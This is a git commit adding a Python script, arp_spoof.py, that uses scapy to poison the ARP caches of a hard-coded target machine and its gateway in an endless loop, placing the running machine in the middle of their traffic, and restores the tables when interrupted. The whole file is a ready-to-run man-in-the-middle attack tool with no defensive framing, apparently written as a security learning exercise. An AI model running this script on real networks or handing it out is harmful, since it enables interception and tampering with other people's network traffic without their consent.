1cc760108d1058d3543368f0f062d8723fc8ee4b
Shukrullo Zaylobidinov <93575250+frontendsd@users.noreply.github.com>
2024-01-23 21:11:35 +0500

    Arp spoofing

---
+++ arp_spoof.py
@@ -0,0 +1,42 @@
+#!usr/bin/env python
+
+
+import time
+import scapy.all as scapy
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+    
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc = source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+target_ip = "192.168.31.176"
+gateway_ip = "192.168.31.1"
+
+try:
+    sent_apckets_count = 0  
+    while True:    
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_apckets_count += 2
+        print("\r[+] Packets count " + str(sent_apckets_count), end="" )    
+        time.sleep(2)
+        
+except KeyboardInterrupt:
+    print("\n[+]Detected CTRL + C ...Resetting ARP tables...Please wait.\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    
